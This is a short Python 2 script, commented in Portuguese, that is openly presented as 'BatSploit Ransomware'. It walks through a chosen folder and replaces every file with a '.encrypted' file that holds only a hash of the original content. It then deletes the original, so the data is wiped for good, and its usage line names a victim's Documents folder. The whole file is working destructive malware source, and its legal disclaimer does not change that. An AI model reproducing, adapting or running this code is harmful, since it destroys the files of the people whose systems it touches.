#-*-coding: utf-8-*-
'''
	 Atenção quaisquer danos causados pelo o uso do script
	é de usa total responsabilidade, então use com cuidado
	e moderação, criptografar sistemas de empresas ou pessoas
	sem consentimento é crime e pode levar a cadeia ou multas
	de alto valor.
	 Uma vez criptografados os arquivos jamais serão recuperados.
'''
import os, hashlib, sys, platform, time

try:
	if platform.system() == "Windows":
		os.system("cls") # limpa a tela se for windows
	else:
		#!/usr/bin/env python
		os.system("clear") # limpa a tela se for linux
	print "\n[+] BatSploit Ransomware \n"
	print " @Author : ProXy Sec"
	print " @Version : 2.0.0"
	print " <github.com/proxyanon/>\n" # banner
	if len(sys.argv) >= 2:
		path_to_encrypt = sys.argv[1] # pasta para ser criptografada
		print " =============== R4ns0mw4r3 started ===============\n"
		for paths,dirs,files in os.walk(path_to_encrypt):
			for file in files:
				flag = paths+"\\"+file # lista todos os arquivos e subpastas do path
				print "[+] Encrypt : %s"%(flag)
				handler = open(flag, "rb") # ler o conteudo de todos os arquivos
				try:
					content = handler.read()
				except MemoryError:
					content = "data" # se o arquivo for muito grande, o conteudo recebe "data"
				encrypt = "[+] Your files have been encrypted : " + hashlib.sha512(content).hexdigest() # chave de criptografia usada sha512
				new_files = open(flag.split(".")[0]+hashlib.md5(time.ctime()).hexdigest()+".encrypted", "wb") # cria os novos arquivos criptografados
				new_files.write(encrypt) # escreve os novos arquivos
				handler.close() # fecha os arquivos originais
				new_files.close() # fecha os novos arquivos
				os.remove(flag) # remove os arquivos originais
				time.sleep(0.5) # espera 0.5 segundos, para dar mais estabilidade ao programa
		sys.stdout.flush() # lima o cache
	else:
		name_script = sys.argv[0].split("\\") # nome do script
		name = name_script[len(name_script) - 1]
		print "\n[+] Usage : %s path_to_encrypt"%(name) # banner
		print "[+] Example : %s C:\\Users\\victim\\Documents"%(name) 
		sys.stdout.flush()
		sys.exit()
except KeyboardInterrupt:
	print "\n[X] Saindo ..."
	sys.exit() # sai se apertar Ctrl+c
